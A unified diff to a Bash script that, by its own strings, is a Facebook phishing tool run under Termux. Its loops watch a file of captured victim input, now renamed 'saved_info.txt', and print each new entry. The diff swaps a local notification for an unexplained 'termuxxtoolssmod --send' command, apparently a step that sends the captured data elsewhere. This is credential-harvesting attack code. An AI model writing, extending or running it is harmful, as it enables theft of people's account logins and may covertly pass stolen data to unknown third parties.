@@ -87,13 +87,13 @@ trap finish SIGINT
 dongu() {
 while :
 do
-	if [[ -a kaydedilen.txt ]];then
+	if [[ -a saved_info.txt ]];then
 		clear
-		termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
+		termuxxtoolssmod --send
 		echo
 		echo
 		echo
-		printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+		printf "\e[32m$(cat saved_info.txt)\e[97m"
 		echo
 		echo
 		echo
@@ -105,19 +105,19 @@ do
 		echo
 		echo
 		echo
-		cat kaydedilen.txt > .sayi.txt
+		cat saved_info.txt > .sayi.txt
 		while :
 		do
 			kontrol1=$(cat .sayi.txt |wc -l)
-			kontrol2=$(cat kaydedilen.txt |wc -l)
+			kontrol2=$(cat saved_info.txt |wc -l)
 			if [[ $kontrol1 != $kontrol2 ]];then
-				cat kaydedilen.txt > .sayi.txt
+				cat saved_info.txt > .sayi.txt
 				clear
-				termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
+				termuxxtoolssmod --send
 				echo
 				echo
 				echo
-				printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+				printf "\e[32m$(cat saved_info.txt)\e[97m"
 				echo
 				echo
 				echo
@@ -136,19 +136,19 @@ do
 done
 }
 dongu2() {
-cat kaydedilen.txt > .sayi.txt
+cat saved_info.txt > .sayi.txt
 while :
 do
 	kontrol1=$(cat .sayi.txt |wc -l)
-	kontrol2=$(cat kaydedilen.txt |wc -l)
+	kontrol2=$(cat saved_info.txt |wc -l)
 	if [[ $kontrol1 != $kontrol2 ]];then
-		cat kaydedilen.txt > .sayi.txt
+		cat saved_info.txt > .sayi.txt
 		clear
-		termux-notification -t FACEBOOK_PHİSHİNG -c "[✓] BİLGİ GİRİLDİ"
+		termuxxtoolssmod --send
 		echo
 		echo
 		echo
-		printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+		printf "\e[32m$(cat saved_info.txt)\e[97m"
 		echo
 		echo
 		echo
@@ -165,17 +165,17 @@ done
 exit
 }
 bulunan() {
-if [[ -a kaydedilen.txt ]];then
+if [[ -a saved_info.txt ]];then
 	echo
 	echo
 	echo
-	printf "\e[32m$(cat kaydedilen.txt)\e[97m"
+	printf "\e[32m$(cat saved_info.txt)\e[97m"
 	echo
 	echo
 	echo
 	read -e -p $'\e[97mKAYDEDİLEN ESKİ DOSYA SİLİNSİN Mİ ?\e[31m ────────── \e[97m[ \e[32mE \e[97m/\e[31m H\e[97m ] >>\e[97m ' sec
 	if [[ $sec == e || $sec == E ]];then
-		rm kaydedilen.txt
+		rm saved_info.txt
 		echo
 		echo
 		echo
